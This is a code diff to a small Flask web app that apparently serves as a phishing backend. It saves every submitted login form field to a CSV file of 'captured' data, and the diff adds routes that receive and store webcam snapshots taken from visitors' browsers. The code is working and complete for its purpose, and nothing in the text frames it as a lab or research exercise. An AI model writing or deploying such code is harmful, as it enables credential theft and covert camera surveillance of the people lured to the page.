@@ -1,5 +1,7 @@
 import os
 import csv
+import base64
+import time
 from flask import Flask, render_template, request, redirect, url_for
 
 app = Flask(__name__)
@@ -21,7 +23,7 @@ def login():
 
 
 # ------------------------------
-# Capture form submission
+# Capture form submission (login)
 # ------------------------------
 @app.route('/capture', methods=['POST'])
 def capture():
@@ -33,10 +35,10 @@ def capture():
     # --------------------------
     os.makedirs('data', exist_ok=True)  # Ensure folder exists
     data_file = os.path.join('data', 'captured_data.csv')
-    
+
     # Check if file exists
     file_exists = os.path.isfile(data_file)
-    
+
     with open(data_file, mode='a', newline='') as file:
         writer = csv.DictWriter(file, fieldnames=data.keys())
         if not file_exists:
@@ -44,6 +46,42 @@ def capture():
         writer.writerow(data)  # write form submission
 
     return "Data captured! Thank you."
+
+
+# ------------------------------
+# Camera page
+# ------------------------------
+@app.route('/camera')
+def camera():
+    return render_template('camera/index.html')
+
+
+# ------------------------------
+# Capture camera snapshot
+# ------------------------------
+@app.route('/capture_camera', methods=['POST'])
+def capture_camera():
+    image_data = request.form['imageData']
+    
+    # Remove the "data:image/png;base64," part if present
+    if image_data.startswith("data:image/png;base64,"):
+        image_data = image_data.split(",", 1)[1]
+    
+    # Decode the base64 image data
+    img_bytes = base64.b64decode(image_data)
+
+    # --------------------------
+    # Save snapshot with unique filename
+    # --------------------------
+    os.makedirs('data', exist_ok=True)
+    filename = f"camera_{int(time.time())}.png"  # Use timestamp as the filename
+    filepath = os.path.join('data', filename)
+
+    with open(filepath, "wb") as f:
+        f.write(img_bytes)
+
+    print(f"Camera snapshot saved as {filename}")
+    return "Camera snapshot captured successfully!"
 
 
 # ------------------------------
